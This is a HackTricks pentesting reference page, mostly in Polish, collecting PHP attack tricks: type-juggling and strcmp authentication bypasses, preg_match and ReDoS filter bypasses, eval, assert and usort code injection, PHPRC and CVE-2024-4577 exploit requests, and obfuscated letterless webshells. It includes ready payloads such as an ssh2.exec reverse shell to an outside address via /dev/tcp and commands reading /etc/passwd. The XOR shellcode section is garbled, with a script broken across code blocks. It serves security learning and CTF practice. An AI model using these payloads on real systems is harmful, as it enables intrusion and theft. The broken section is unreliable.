# Sztuczki PHP

{{#include ../../../banners/hacktricks-training.md}}

## Cookies — typowe lokalizacje:

To samo dotyczy cookies phpMyAdmin.

Cookies:
```
PHPSESSID
phpMyAdmin
```
Lokalizacje:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Ominięcie porównań w PHP

### Loose comparisons/Type Juggling ( == )

If `==` is used in PHP, then there are unexpected cases where the comparison doesn't behave as expected. This is because "==" only compare values transformed to the same type, if you also want to compare that the type of the compared data is the same you need to use `===`.

PHP comparison tables: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../images/image (567).png>)

{{#file}}
EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf
{{#endfile}}

- `"string" == 0 -> True` Ciąg znaków, który nie zaczyna się od cyfry, jest równy liczbie
- `"0xAAAA" == "43690" -> True` Ciągi składające się z liczb w formacie dziesiętnym lub hex mogą być porównywane z innymi liczbami/ciągami i dawać True jeśli liczby są takie same (liczby w stringu są interpretowane jako liczby)
- `"0e3264578" == 0 --> True` Ciąg zaczynający się od "0e" i po nim cokolwiek będzie równy 0
- `"0X3264578" == 0X --> True` Ciąg zaczynający się od "0" i po nim dowolna litera (X może być dowolną literą) i dalej cokolwiek będzie równy 0
- `"0e12334" == "0" --> True` To jest bardzo interesujące, ponieważ w niektórych przypadkach możesz kontrolować wejściowy ciąg dla "0" i pewną treść, która jest hashowana i porównywana z nim. W związku z tym, jeśli możesz dostarczyć wartość, która wygeneruje hash zaczynający się od "0e" i bez żadnej litery, możesz ominąć porównanie. Możesz znaleźć już zhashowane ciągi w tym formacie tutaj: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
- `"X" == 0 --> True` Każda litera w stringu jest równa int 0

More info in [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in_array()**

**Type Juggling** also affects to the `in_array()` function by default (you need to set to true the third argument to make an strict comparison):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Jeśli ta funkcja jest używana do **any authentication check** (np. sprawdzania password) i użytkownik kontroluje jedną stronę porównania, może wysłać pustą tablicę zamiast stringa jako wartość password (`https://example.com/login.php/?username=admin&password[]=`) i ominąć to sprawdzenie:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Ten sam błąd występuje z `strcasecmp()`

### Ścisłe mieszanie typów

Nawet jeśli `===` jest **używane**, mogą wystąpić błędy, które sprawiają, że **porównanie jest podatne** na **mieszanie typów**. Na przykład, jeśli porównanie **konwertuje dane na inny typ obiektu przed porównaniem**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg_match(/^.\*/)

**`preg_match()`** może być użyte do **walidacji danych wejściowych** ( **sprawdza**, czy jakiekolwiek **word/regex** z **blacklist** jest **obecne** w **danych wejściowych**, i jeśli nie, kod może kontynuować wykonanie).

#### New line bypass

Jednak przy delimitowaniu początku regexp`preg_match()` **sprawdza tylko pierwszą linię danych wejściowych**, więc jeśli w jakiś sposób możesz **wysłać** dane wejściowe w **kilku liniach**, możesz ominąć tę kontrolę. Przykład:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Aby ominąć tę kontrolę możesz **wysłać wartość z nowymi liniami urlencoded** (`%0A`) lub jeśli możesz wysyłać **dane JSON**, wyślij je **w kilku liniach**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Znajdź przykład tutaj: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Length error bypass**

(Ten bypass najwyraźniej był testowany na PHP 5.2.5 i nie udało mi się go uruchomić na PHP 7.3.15)\
Jeśli możesz wysłać do `preg_match()` poprawne, bardzo **duże dane wejściowe**, to **nie będzie w stanie ich przetworzyć** i będziesz w stanie **bypass** sprawdzenia. Na przykład, jeśli stosuje blacklisting dla JSON, możesz wysłać:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
From: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### ReDoS Bypass

Sztuczka pochodzi z: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) and [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../images/image (26).png" alt=""><figcaption></figcaption></figure>

W skrócie problem występuje, ponieważ funkcje `preg_*` w PHP opierają się na [PCRE library](http://www.pcre.org/). W PCRE pewne wyrażenia regularne są dopasowywane przez użycie wielu wywołań rekurencyjnych, co zużywa dużo pamięci stosu. Możliwe jest ustawienie limitu liczby dozwolonych rekurencji, ale w PHP ten limit [defaults to 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), co jest więcej niż mieści się w stosie.

[This Stackoverflow thread](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) był również podlinkowany w poście, gdzie opisano ten problem bardziej szczegółowo. Nasze zadanie stało się więc jasne:\  
**Wyślij dane wejściowe, które spowodują, że regex wykona 100_000+ rekurencji, powodując SIGSEGV, sprawiając że funkcja `preg_match()` zwróci `false`, przez co aplikacja uzna, że nasze dane nie są złośliwe, a na końcu ładunku dorzuć niespodziankę w postaci czegoś takiego `{system(<verybadcommand>)}` żeby uzyskać SSTI --> RCE --> flag :)**.

Cóż, w terminologii regex nie wykonujemy tak naprawdę 100k "rekurencji", lecz liczymy "backtracking steps", które, jak stwierdza [PHP documentation](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), domyślnie ustawione są na 1_000_000 (1M) w zmiennej `pcre.backtrack_limit`.\  
Aby to osiągnąć, `'X'*500_001` spowoduje 1 milion kroków backtrackingu (500k do przodu i 500k do tyłu):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Type Juggling dla obfuscation w PHP
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

Jeśli PHP przekierowuje na inną stronę, ale funkcja **`die`** lub **`exit`** nie jest **wywoływana po ustawieniu nagłówka `Location`**, PHP nadal wykonuje kod i dopisuje dane do treści odpowiedzi:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Path Traversal and File Inclusion Exploitation

Sprawdź:


{{#ref}}
../../../pentesting-web/file-inclusion/
{{#endref}}

## Więcej trików

- **register_globals**: In **PHP < 4.1.1.1** or if misconfigured, **register_globals** may be active (or their behavior is being mimicked). This implies that in global variables like $\_GET if they have a value e.g. $\_GET\["param"]="1234", you can access it via **$param. Therefore, by sending HTTP parameters you can overwrite variables** that are used within the code.
- The **PHPSESSION cookies of the same domain are stored in the same place**, dlatego jeśli w obrębie domeny **different cookies are used in different paths** możesz sprawić, że jedna ścieżka **accesses the cookie of the path** ustawiając wartość cookie innej ścieżki.\
W ten sposób, jeśli **both paths access a variable with the same name** możesz sprawić, że **value of that variable in path1 apply to path2**. I wtedy path2 zaakceptuje jako ważne zmienne z path1 (dając cookie nazwę, która odpowiada jej w path2).
- Jeśli masz **usernames** użytkowników maszyny, sprawdź adres: **/\~\<USERNAME>** aby zobaczyć, czy katalogi php są aktywowane.
- Jeśli konfiguracja php ma **`register_argc_argv = On`** to parametry w zapytaniu oddzielone spacjami są używane do wypełnienia tablicy argumentów **`array_keys($_SERVER['argv'])`** jakby były **argumentami z CLI**. To jest interesujące, ponieważ jeśli to **ustawienie jest wyłączone**, wartość tablicy args będzie `Null` gdy wywołane z weba, ponieważ tablica args nie zostanie wypełniona. Dlatego, jeśli strona próbuje sprawdzić czy działa jako web czy jako narzędzie CLI porównaniem typu `if (empty($_SERVER['argv'])) {` atakujący może wysłać **parametry w GET jak `?--configPath=/lalala`** i skrypt pomyśli, że działa jako CLI i ewentualnie sparsuje i użyje tych argumentów. Więcej informacji w [original writeup](https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms).
- [**LFI and RCE using php wrappers**](../../../pentesting-web/file-inclusion/index.html)

### password_hash/password_verify

This functions are typically used in PHP to **generate hashes from passwords** and to to **check** if a password is correct compared with a hash.\
The supported algorithms are: `PASSWORD_DEFAULT` and `PASSWORD_BCRYPT` (starts with `$2y$`). Note that **PASSWORD_DEFAULT is frequently the same as PASSWORD_BCRYPT.** And currently, **PASSWORD_BCRYPT** has a **size limitation in the input of 72bytes**. Therefore, when you try to hash something larger than 72bytes with this algorithm only the first 72B will be used:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### Omijanie nagłówków HTTP wykorzystując błędy PHP

#### Spowodowanie błędu po ustawieniu nagłówków

Z [**this twitter thread**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A&s=19) wynika, że wysyłając więcej niż 1000 parametrów GET, 1000 parametrów POST lub 20 plików, PHOP nie będzie ustawiać nagłówków w odpowiedzi.

Pozwala to np. obejść ustawianie nagłówków CSP w kodzie takim jak:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### Wypełnianie treści odpowiedzi przed ustawieniem nagłówków

Jeśli **strona PHP wypisuje błędy i echouje z powrotem dane przekazane przez użytkownika**, użytkownik może spowodować, że serwer PHP wypisze **zawartość wystarczająco długą**, tak że gdy spróbuje **dodać nagłówki** do odpowiedzi, serwer zgłosi błąd.\
W poniższym scenariuszu **atakujący spowodował, że serwer wygenerował duże błędy**, i jak widać na zrzucie, gdy php próbował **zmodyfikować informacje o nagłówkach, nie mógł tego zrobić** (np. nagłówek CSP nie został wysłany do użytkownika):

![](<../../../images/image (1085).png>)

## SSRF w funkcjach PHP

Sprawdź stronę:


{{#ref}}
php-ssrf.md
{{#endref}}

## ssh2.exec stream wrapper RCE
Gdy rozszerzenie `ssh2` jest zainstalowane (`ssh2.so` widoczny w `/etc/php*/mods-available/`, `php -m`, lub nawet w katalogu `php8.1_conf/` dostępnym przez FTP), PHP rejestruje wrappery `ssh2.*`, które mogą być nadużyte wszędzie tam, gdzie wejście użytkownika jest konkatenowane do celów `fopen()/file_get_contents()`. Pomocnik do pobierania przeznaczony tylko dla administratora, taki jak:
```php
$wrapper = strpos($_GET['format'], '://') !== false ? $_GET['format'] : '';
$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
```
wystarczy, aby wykonać shell commands over localhost SSH:
```http
GET /download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1:22/ping%2010.10.14.6%20-c%201#
```
* Część credential może ponownie użyć dowolnego leaked system password (np. z cracked bcrypt hashes).
* Kończące `#` komentuje sufiks po stronie serwera (`files/<id>.zip`), więc uruchomi się tylko twoje polecenie.
* Blind RCE potwierdza się, obserwując egress za pomocą `tcpdump -ni tun0 icmp` lub serwując HTTP canary.

Zamień polecenie na reverse shell payload po potwierdzeniu:
```http
format=ssh2.exec://yuri:mustang@127.0.0.1:22/bash%20-c%20'bash%20-i%20>&%20/dev/tcp/10.10.14.6/443%200>&1'#
```
Ponieważ wszystko dzieje się w procesie PHP, połączenie TCP jest inicjowane przez cel i dziedziczy uprawnienia wstrzykniętego konta (`yuri`, `eric`, itp.).

## Wykonanie kodu

**system("ls");**\
**`ls`;**\
**shell_exec("ls");**

[Check this for more useful PHP functions](php-useful-functions-disable_functions-open_basedir-bypass/index.html)

### **RCE via** **preg_replace()**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Aby wykonać kod w argumencie "replace", potrzebne jest co najmniej jedno dopasowanie.\
Ta opcja preg_replace została **wycofana od PHP 5.5.0.**

### **RCE via Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE przez Assert()**

Ta funkcja w php pozwala **wykonywać kod zapisany w łańcuchu znaków** w celu **zwrócenia true lub false** (i w zależności od tego zmienić wykonanie). Zwykle zmienna pochodząca od użytkownika będzie wstawiona w środku łańcucha. Na przykład:\
`assert("strpos($_GET['page']),'..') === false")` --> W tym przypadku, aby uzyskać **RCE**, możesz zrobić:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Będziesz musiał **zepsuć** składnię kodu, **dodać** swój **payload**, a następnie **naprawić ją ponownie**. Możesz użyć **operacji logicznych** takich jak "**and" or "%26%26" or "|"**. Zauważ, że "or", "||" nie działają, ponieważ jeśli pierwszy warunek jest prawdziwy, nasz payload nie zostanie wykonany. Podobnie ";" nie działa, ponieważ nasz payload nie zostanie wykonany.

**Other option** is to add to the string the execution of the command: `'.highlight_file('.passwd').'`

**Other option** (if you have the internal code) is to modify some variable to alter the execution: `$file = "hola"`

### **RCE przez usort()**

Ta funkcja służy do sortowania tablicy elementów przy użyciu określonej funkcji.\
Aby nadużyć tej funkcji:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Możesz także użyć **//** aby skomentować resztę kodu.

Aby odkryć liczbę nawiasów, które trzeba zamknąć:

- `?order=id;}//`: otrzymujemy komunikat o błędzie (`Parse error: syntax error, unexpected ';'`). Prawdopodobnie brakuje jednego lub więcej nawiasów.
- `?order=id);}//`: otrzymujemy **ostrzeżenie**. To wydaje się właściwe.
- `?order=id));}//`: otrzymujemy komunikat o błędzie (`Parse error: syntax error, unexpected ')' i`). Prawdopodobnie mamy za dużo zamykających nawiasów.

### **RCE via .httaccess**

If you can **upload** a **.htaccess**, then you can **configure** several things and even execute code (configuring that files with extension .htaccess can be **executed**).

Different .htaccess shells can be found [here](https://github.com/wireghoul/htshells)

### RCE via Env Variables

If you find a vulnerability that allows you to **modify env variables in PHP** (and another one to upload files, although with more research maybe this can be bypassed), you could abuse this behaviour to get **RCE**.

- [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/index.html#ld_preload-and-ld_library_path): Ta zmienna env pozwala ładować dowolne biblioteki podczas uruchamiania innych binarek (choć w tym przypadku może nie zadziałać).
- **`PHPRC`** : Wskazuje PHP, gdzie znaleźć jego plik konfiguracyjny, zwykle nazywany `php.ini`. Jeśli możesz przesłać własny plik konfiguracyjny, użyj `PHPRC`, aby wskazać na niego PHP. Dodaj wpis **`auto_prepend_file`** wskazujący drugi przesłany plik. Ten drugi plik zawiera normalny kod **PHP**, który jest następnie wykonywany przez runtime PHP przed innym kodem.
1. Upload a PHP file containing our shellcode
2. Upload a second file, containing an **`auto_prepend_file`** directive instructing the PHP preprocessor to execute the file we uploaded in step 1
3. Set the `PHPRC` variable to the file we uploaded in step 2.
- Get more info on how to execute this chain [**from the original report**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
- **PHPRC** - another option
- If you **cannot upload files**, you could use in FreeBSD the "file" `/dev/fd/0` which contains the **`stdin`**, being the **body** of the request sent to the `stdin`:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
- Or to get RCE, enable **`allow_url_include`** and prepend a file with **base64 PHP code**:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
- Technique [**from this report**](https://vulncheck.com/blog/juniper-cve-2023-36845).

### XAMPP CGI RCE - CVE-2024-4577

Serwer WWW parsuje żądania HTTP i przekazuje je do skryptu PHP, wykonując żądanie takie jak [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar&ref=labs.watchtowr.com) jako `php.exe cgi.php foo=bar`, co pozwala na parameter injection. To umożliwia wstrzyknięcie następujących parametrów, aby załadować kod PHP z body:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
Co więcej, możliwe jest wstrzyknięcie parametru "-" używając znaku 0xAD z powodu późniejszej normalizacji PHP. Sprawdź przykład exploit z [**this post**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/):
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitization bypass & Brain Fuck

[**In this post**](https://blog.redteam-pentesting.de/2024/moodle-rce/) można znaleźć świetne pomysły na wygenerowanie brain fuck PHP code przy bardzo ograniczonej liczbie dozwolonych znaków.\
Ponadto zaproponowano interesujący sposób wywoływania funkcji, który pozwolił im obejść kilka walidacji:
```php
(1)->{system($_GET[chr(97)])}
```
## Analiza statyczna PHP

Sprawdź, czy możesz wstawić kod w wywołaniach tych funkcji (from [here](https://www.youtube.com/watch?v=SyWUsN0yHKI&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Jeśli debugujesz aplikację PHP możesz globalnie włączyć wypisywanie błędów w`/etc/php5/apache2/php.ini` dodając `display_errors = On` i zrestartować apache : `sudo systemctl restart apache2`

### Deobfuskacja kodu PHP

Możesz użyć **serwisu**[ **www.unphp.net**](http://www.unphp.net) **do deobfuskacji kodu PHP.**

## PHP Wrappers i protokoły

PHP Wrappers i protokoły mogą pozwolić na **bypass write and read protections** w systemie i jego przejęcie. Dla [**więcej informacji sprawdź tę stronę**](../../../pentesting-web/file-inclusion/index.html#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug nieautoryzowane RCE

Jeśli widzisz, że **Xdebug** jest **włączony** w wyjściu `phpconfig()`, powinieneś spróbować uzyskać RCE za pomocą [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Zmienne zmienne
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE abusing new $\_GET\["a"]\($\_GET\["b"])

Jeśli na stronie możesz **utworzyć nowy obiekt dowolnej klasy**, możesz być w stanie uzyskać RCE — sprawdź następującą stronę, aby dowiedzieć się jak:


{{#ref}}
php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md
{{#endref}}

## Wykonywanie PHP bez użycia liter

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Użycie notacji ósemkowej
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR easy shell code

Zgodnie z [**this writeup** ](https://mgp25.com/ctf/Web-challenge/), można w ten sposób wygenerować prosty shellcode:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Zatem, jeśli możesz **wykonać dowolny kod PHP bez użycia cyfr i liter**, możesz wysłać żądanie takie jak poniższe, wykorzystując ten payload do wykonania dowolnego kodu PHP:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Aby uzyskać bardziej szczegółowe wyjaśnienie, sprawdź [https://ctf-wiki.org/web/php/php/#preg_match](https://ctf-wiki.org/web/php/php/#preg_match)

### XOR Shellcode (wewnątrz eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl-podobne
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
## Referencje
- [0xdf – HTB Era: abusing ssh2.exec stream wrappers](https://0xdf.gitlab.io/2025/11/29/htb-era.html)

{{#include ../../../banners/hacktricks-training.md}}
